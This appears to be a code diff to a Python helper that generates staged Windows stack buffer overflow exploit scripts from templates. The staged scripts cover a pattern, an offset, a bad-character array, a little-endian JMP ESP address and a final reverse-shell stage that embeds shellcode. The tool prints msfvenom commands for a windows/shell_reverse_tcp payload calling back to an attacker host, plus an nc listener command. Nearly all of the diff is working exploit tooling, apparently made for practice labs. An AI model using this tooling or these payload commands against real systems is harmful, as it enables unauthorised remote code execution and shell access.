@@ -79,6 +79,7 @@ def gen2():
         line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
         line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
         line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
+        line = line.replace("WAIT_FOR_REPLACE_GENERATED_PATTERN", simpleoverflowhelper.config["pattern"])
         fw.write(line)
     fw.close()
     fr.close()
@@ -105,6 +106,7 @@ def gen3():
         line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
         line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
         line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
+        line = line.replace("WAIT_FOR_REPLACE_OFFSET", simpleoverflowhelper.config["offset"])
         fw.write(line)
     fw.close()
     fr.close()
@@ -126,6 +128,22 @@ def gen4():
     template_filename = "4-find-badchars-template.py"
     if "output" in  simpleoverflowhelper.config:
         filename = simpleoverflowhelper.config["output"]
+
+    goodchar_map = {}
+    for i in range(256):
+        goodchar_map[i] = True
+    if simpleoverflowhelper.config["badchar"] != "":
+        for i in simpleoverflowhelper.config["badchar"].split(','):
+            goodchar_map[int(i, 16)] = False
+        
+    badchar_var = "badchars = (\""
+    for x in range(0, 256):
+        if x > 15 and x % 16 == 0 :
+            badchar_var += "\\\n"
+        if goodchar_map[x]:
+            badchar_var += "\\x" + hex(x).split('x')[1].rjust(2,'0')
+    badchar_var += '")'
+
     fw = open(filename, 'w')
     fr = open(template_filename, 'r')
     template_lines = fr.readlines()
@@ -133,6 +151,8 @@ def gen4():
         line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
         line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
         line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
+        line = line.replace("WAIT_FOR_REPLACE_OFFSET", simpleoverflowhelper.config["offset"])
+        line = line.replace("WAIT_FOR_REPLACE_BADCHARS_VAR", badchar_var)
         fw.write(line)
     fw.close()
     fr.close()
@@ -143,11 +163,10 @@ def gen4():
 
     print("You might want to run after the sctipt command: ")
     print("./" + filename)
-    print("You might have not collected all bad chars also \\x00 is hightly one of them:")
+    print("You might have not collected all bad chars also \"0\" is hightly one of them:")
     print("./simpleoverflowhelper.py 4 -b \"" + simpleoverflowhelper.config["badchar"] + "\"")
     print("After got all bad chars try to get the address of jmp esp instruction with no protection: ")
     print("./simpleoverflowhelper.py 5 -j 65332193")
-    print("./4-find-badchars.py")
     pass
 
 def gen5():
@@ -155,6 +174,10 @@ def gen5():
     template_filename = "5-verifiy-jmp-pointer-template.py"
     if "output" in  simpleoverflowhelper.config:
         filename = simpleoverflowhelper.config["output"]
+
+    jmpaddress = simpleoverflowhelper.config["jmpaddress"].rjust(8, '0').lower()
+    jmpaddress = "\\x" + jmpaddress[6:8] + "\\x" + jmpaddress[4:6] + "\\x" + jmpaddress[2:4] + "\\x" + jmpaddress[0:2]
+
     fw = open(filename, 'w')
     fr = open(template_filename, 'r')
     template_lines = fr.readlines()
@@ -162,6 +185,8 @@ def gen5():
         line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
         line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
         line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
+        line = line.replace("WAIT_FOR_REPLACE_OFFSET", simpleoverflowhelper.config["offset"])
+        line = line.replace("WAIT_FOR_REPLACE_JMP_ADDRESS", jmpaddress)
         fw.write(line)
     fw.close()
     fr.close()
@@ -170,13 +195,19 @@ def gen5():
     
     os.chmod(filename, 0o777)
 
+    # idea: add option lport and lhost for suggest command
+
     print("You might want to run after the sctipt command: ")
     print("./" + filename)
-    print("msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread -f py -a x86 -b \"" + simpleoverflowhelper.config["badchar"] + "\" LPORT=4444 LHOST=$ip")
-    print("msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread -f py -a x86 -b \"" + simpleoverflowhelper.config["badchar"] + "\" LPORT=4444 LHOST=$ip > shell.txt")
-    print("nc -lnvp 4444")
+    if simpleoverflowhelper.config["badchar"] != "":
+        badchar = "".join([ "\\x" + i.rjust(2,'0') for i in simpleoverflowhelper.config["badchar"].split(',')])
+        print("msfvenom -p windows/shell_reverse_tcp exitfunc=thread -f py -a x86 -b \"" + badchar + "\" lport=4444 lhost=$ip")
+        print("msfvenom -p windows/shell_reverse_tcp exitfunc=thread -f py -a x86 -b \"" + badchar + "\" lport=4444 lhost=$ip > shell.txt")
+    else:
+        print("Wonderful no badchars!!")
+        print("msfvenom -p windows/shell_reverse_tcp exitfunc=thread -f py -a x86 lport=4444 lhost=$ip")
+        print("msfvenom -p windows/shell_reverse_tcp exitfunc=thread -f py -a x86 lport=4444 lhost=$ip > shell.txt")
     print("./simpleoverflowhelper.py 6 -s shell.txt")
-    print("./5-verifiy-jmp-pointer.py")
     pass
 
 def gen6():
@@ -184,6 +215,12 @@ def gen6():
     template_filename = "6-get-reverse-shell-template.py"
     if "output" in  simpleoverflowhelper.config:
         filename = simpleoverflowhelper.config["output"]
+
+    jmpaddress = simpleoverflowhelper.config["jmpaddress"].rjust(8, '0').lower()
+    jmpaddress = "\\x" + jmpaddress[6:8] + "\\x" + jmpaddress[4:6] + "\\x" + jmpaddress[2:4] + "\\x" + jmpaddress[0:2]
+    fr = open(simpleoverflowhelper.config["shellfile"], 'r')
+    shellfile = "".join(fr.readlines()).strip()
+
     fw = open(filename, 'w')
     fr = open(template_filename, 'r')
     template_lines = fr.readlines()
@@ -191,6 +228,9 @@ def gen6():
         line = line.replace("WAIT_FOR_REPLACE_IP", simpleoverflowhelper.config["host"])
         line = line.replace("WAIT_FOR_REPLACE_PORT", str(simpleoverflowhelper.config["port"]))
         line = line.replace("WAIT_FOR_REPLACE_PREFIX", simpleoverflowhelper.config["prefix"])
+        line = line.replace("WAIT_FOR_REPLACE_OFFSET", simpleoverflowhelper.config["offset"])
+        line = line.replace("WAIT_FOR_REPLACE_JMP_ADDRESS", jmpaddress)
+        line = line.replace("WAIT_FOR_REPLACE_SHELL_FILE", shellfile)
         fw.write(line)
     fw.close()
     fr.close()
@@ -200,6 +240,7 @@ def gen6():
     os.chmod(filename, 0o777)
 
     print("You might want to run after the sctipt command: ")
+    print("nc -lnvp 4444")
     print("./" + filename)
     pass
 
